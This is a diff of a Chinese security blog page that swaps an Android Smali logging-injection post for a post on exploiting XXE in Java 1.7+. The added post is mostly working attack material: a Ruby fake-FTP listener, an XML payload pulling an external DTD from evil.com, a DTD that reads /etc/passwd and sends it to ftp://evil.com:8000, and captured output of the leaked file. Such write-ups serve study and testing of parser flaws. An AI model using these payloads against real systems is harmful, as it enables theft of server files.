@@ -6,18 +6,18 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://adrain09.github.io">
-  <title>加强版smail注入 | NoSec World</title>
+  <title>java 1.7+ xxe入侵 | NoSec World</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="可以自己建一个crack.smali文件，并定义自己的Log信息输出函数，如下：">
+  <meta name="description" content="Java 在1.7版本以上对gopher协议进行了修复，在1.7+处理不合法的url时候会爆出：">
 <meta property="og:type" content="article">
-<meta property="og:title" content="加强版smail注入">
-<meta property="og:url" content="https://adrain09.github.io/2017/01/10/移动安全/加强版Smali Log注入/index.html">
+<meta property="og:title" content="java 1.7+ xxe入侵">
+<meta property="og:url" content="https://adrain09.github.io/2017/02/05/安全测试/JAVA1.7+ XXE实体入侵/index.html">
 <meta property="og:site_name" content="NoSec World">
-<meta property="og:description" content="可以自己建一个crack.smali文件，并定义自己的Log信息输出函数，如下：">
-<meta property="og:updated_time" content="2017-01-23T02:40:54.687Z">
+<meta property="og:description" content="Java 在1.7版本以上对gopher协议进行了修复，在1.7+处理不合法的url时候会爆出：">
+<meta property="og:updated_time" content="2017-02-06T03:58:08.255Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="加强版smail注入">
-<meta name="twitter:description" content="可以自己建一个crack.smali文件，并定义自己的Log信息输出函数，如下：">
+<meta name="twitter:title" content="java 1.7+ xxe入侵">
+<meta name="twitter:description" content="Java 在1.7版本以上对gopher协议进行了修复，在1.7+处理不合法的url时候会爆出：">
   
     <link rel="alternative" href="/atom.xml" title="NoSec World" type="application/atom+xml">
   
@@ -163,31 +163,36 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-移动安全/加强版Smali Log注入" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-安全测试/JAVA1.7+ XXE实体入侵" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      加强版smail注入
+      java 1.7+ xxe入侵
     </h1>
   
 
-        <a href="/2017/01/10/移动安全/加强版Smali Log注入/" class="archive-article-date">
-  	<time datetime="2017-01-10T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-10</time>
+        <a href="/2017/02/05/安全测试/JAVA1.7+ XXE实体入侵/" class="archive-article-date">
+  	<time datetime="2017-02-05T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-05</time>
 </a>
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>可以自己建一个crack.smali文件，并定义自己的Log信息输出函数，如下：</p>
+        <p>Java 在1.7版本以上对gopher协议进行了修复，在1.7+处理不合法的url时候会爆出：</p>
 <a id="more"></a>
-<figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">.class</span><span class="keyword"> public</span> <span class="class">Lcrack;</span></div><div class="line"><span class="keyword">.super</span> <span class="class">Ljava/lang/Object;</span></div><div class="line"><span class="keyword">.source</span> <span class="string">"crack.java"</span></div><div class="line"></div><div class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> static</span> log1(<span class="class">Ljava/lang/String;</span>)V <span class="comment">#打印出info 1字符串</span></div><div class="line"><span class="keyword">    .locals</span> 1</div><div class="line"><span class="keyword">    .prologue</span></div><div class="line"></div><div class="line">   <span class="built_in"> const-string </span>v0, <span class="string">"info 1"</span></div><div class="line">   <span class="built_in"> invoke-static </span>&#123;v0, p0&#125;, <span class="class">Landroid/util/Log;</span>-&gt;d(<span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span>)I</div><div class="line">   <span class="built_in"> return-void</span></div><div class="line"><span class="keyword">.end method</span></div><div class="line"></div><div class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> static</span> log2(<span class="class">Ljava/lang/String;</span>)V <span class="comment">#打印出info 2字符串</span></div><div class="line"><span class="keyword">    .locals</span> 1</div><div class="line"><span class="keyword">    .prologue</span></div><div class="line"></div><div class="line">   <span class="built_in"> const-string </span>v0, <span class="string">"info 2"</span></div><div class="line">   <span class="built_in"> invoke-static </span>&#123;v0, p0&#125;, <span class="class">Landroid/util/Log;</span>-&gt;d(<span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span>)I</div><div class="line">   <span class="built_in"> return-void</span></div><div class="line"><span class="keyword">.end method</span></div><div class="line"></div><div class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> static</span> log3(<span class="class">Ljava/lang/String;</span>)V <span class="comment">#打印出info 3字符串</span></div><div class="line"><span class="keyword">    .locals</span> 1</div><div class="line"><span class="keyword">    .prologue</span></div><div class="line"></div><div class="line">   <span class="built_in"> const-string </span>v0, <span class="string">"info 3"</span></div><div class="line">   <span class="built_in"> invoke-static </span>&#123;v0, p0&#125;, <span class="class">Landroid/util/Log;</span>-&gt;d(<span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span>)I</div><div class="line">   <span class="built_in"> return-void</span></div><div class="line"><span class="keyword">.end method</span></div><div class="line"></div><div class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> static</span> I(I)V   <span class="comment">#打印出int型值</span></div><div class="line"><span class="keyword">    .locals</span> 2</div><div class="line"></div><div class="line"><span class="keyword">    .prologue</span></div><div class="line"></div><div class="line">   <span class="built_in"> const-string </span>v0, <span class="string">"info_int"</span></div><div class="line"></div><div class="line">   <span class="built_in"> invoke-static </span>&#123;p0&#125;, <span class="class">Ljava/lang/String;</span>-&gt;valueOf(I)<span class="class">Ljava/lang/String;</span></div><div class="line"></div><div class="line">   <span class="built_in"> move-result-object </span>v1</div><div class="line"></div><div class="line">   <span class="built_in"> invoke-static </span>&#123;v0, v1&#125;, <span class="class">Landroid/util/Log;</span>-&gt;d(<span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span>)I</div><div class="line"></div><div class="line">   <span class="built_in"> return-void</span></div><div class="line"><span class="keyword">.end method</span></div><div class="line"></div><div class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> static</span> J(J)V <span class="comment">#打印出long类型的值</span></div><div class="line"><span class="keyword">.locals</span> 2</div><div class="line"></div><div class="line"><span class="keyword">.prologue</span></div><div class="line"><span class="built_in"></span></div><div class="line">const-string v0, <span class="string">"info_long"</span></div><div class="line"><span class="built_in"></span></div><div class="line">invoke-static &#123;p0, p1&#125;, <span class="class">Ljava/lang/String;</span>-&gt;valueOf(J)<span class="class">Ljava/lang/String;</span></div><div class="line"><span class="built_in"></span></div><div class="line">move-result-object v1</div><div class="line"><span class="built_in"></span></div><div class="line">invoke-static &#123;v0, v1&#125;, <span class="class">Landroid/util/Log;</span>-&gt;d(<span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span>)I</div><div class="line"><span class="built_in"></span></div><div class="line">return-void</div><div class="line"><span class="keyword">.end method</span></div></pre></td></tr></table></figure>
-<p>这个时候就只需要添加一行代码就行了：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">invoke-static &#123;v1&#125;, Lcrack;-&gt;log1(Ljava/lang/String;)V</div></pre></td></tr></table></figure>
-<p>如果是int或者long类型的话，如下调用即可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">invoke-static &#123;v0&#125;, Lcrack;-&gt;I(I)V</div><div class="line">invoke-static &#123;v1,v2&#125;, Lcrack;-&gt;J(J)V</div></pre></td></tr></table></figure>
+<p>错误：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">java.net.MalformedURLException: Illegal character in URL</div><div class="line">at sun.net.www.http.HttpClient.getURLFile(HttpClient.java:<span class="number">583</span>)</div><div class="line">at sun.net.www.protocol.http.HttpURLConnection.getRequestURI(HttpURLConnection.java:<span class="number">2298</span>)</div><div class="line">at sun.net.www.protocol.http.HttpURLConnection.writeRequests(HttpURLConnection.java:<span class="number">513</span>)</div><div class="line">...</div><div class="line">at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:<span class="number">141</span>)</div><div class="line">at com.sun.org.apache.xerces.internal.parsers.DOMParser.parse(DOMParser.java:<span class="number">243</span>)</div><div class="line">at com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderImpl.parse(DocumentBuilderImpl.java:<span class="number">347</span>)</div></pre></td></tr></table></figure>
+<p>XMLParser处理xml，提供了xml实体注入的风险</p>
+<p>要利用这个问题，可采用ftp方式接受服务器的数据信息：</p>
+<p>脚本地址：<a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb" target="_blank" rel="external">https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb</a></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">require</span> <span class="string">'socket'</span></div><div class="line">server = TCPServer.new <span class="number">8000</span></div><div class="line">loop <span class="keyword">do</span></div><div class="line">  Thread.start(server.accept) <span class="keyword">do</span> <span class="params">|client|</span></div><div class="line">    puts <span class="string">"New client connected"</span></div><div class="line">    data = <span class="string">""</span></div><div class="line">    client.puts(<span class="string">"220 xxe-ftp-server"</span>)</div><div class="line">    loop &#123;</div><div class="line">        req = client.gets()</div><div class="line">        puts <span class="string">"&lt; "</span>+req</div><div class="line">        <span class="keyword">if</span> req.<span class="keyword">include</span>? <span class="string">"USER"</span></div><div class="line">            client.puts(<span class="string">"331 password please - version check"</span>)</div><div class="line">        <span class="keyword">else</span></div><div class="line">            puts <span class="string">"&gt; 230 more data please!"</span></div><div class="line">            client.puts(<span class="string">"230 more data please!"</span>)</div><div class="line">        <span class="keyword">end</span></div><div class="line">    &#125;</div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line">’‘’</div><div class="line"></div><div class="line">利用poc：</div><div class="line"></div><div class="line"><span class="string">``</span><span class="string">`xml</span></div><div class="line">&lt;?xml version="1.0"?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">   &lt;!ENTITY % asd SYSTEM "http://evil.com/ext.dtd"&gt;</div><div class="line">   %asd;</div><div class="line">   %rrr;</div><div class="line">]&gt;</div><div class="line">&lt;a&gt;&lt;/a&gt;</div></pre></td></tr></table></figure>
+<p>外部dtd：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % b SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">&lt;!ENTITY % c &quot;&lt;!ENTITY &amp;#37; rrr SYSTEM &apos;ftp://evil.com:8000/%b;&apos;&gt;&quot;&gt;</div></pre></td></tr></table></figure>
+<p>利用输入传递数据到ftp命令中去：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">New client connected</div><div class="line">&lt; USER anonymous</div><div class="line">&lt; PASS Java1.7.0_45@</div><div class="line">&gt; 230 more data please!</div><div class="line">&lt; TYPE I</div><div class="line">&gt; 230 more data please!</div><div class="line">&lt; CWD root:x:0:0:root:</div><div class="line">&gt; 230 more data please!</div><div class="line">&lt; CWD root:</div><div class="line">&gt; 230 more data please!</div><div class="line">&lt; CWD bin</div><div class="line">&gt; 230 more data please!</div><div class="line">&lt; CWD bash</div><div class="line">&gt; 230 more data please!</div><div class="line">&lt; daemon:x:1:1:daemon:</div></pre></td></tr></table></figure>
 
       
 
@@ -224,7 +229,7 @@
       
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/移动安全/">移动安全</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全测试/">安全测试</a></li></ul>
 	</div>
 
       
@@ -277,7 +282,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=https://adrain09.github.io/2017/01/10/移动安全/加强版Smali Log注入/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=https://adrain09.github.io/2017/02/05/安全测试/JAVA1.7+ XXE实体入侵/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -291,18 +296,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2017/01/10/智能硬件/物联网安全设计/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          物联网安全设计
-        
-      </div>
-    </a>
   
-  
-    <a href="/2017/01/10/移动安全/mobSF架构分析/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">MobSF框架分析</div>
+    <a href="/2017/02/03/数学/一些有意思的数学/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">一些有趣的数学</div>
       <i class="icon-circle-right"></i>
     </a>
   
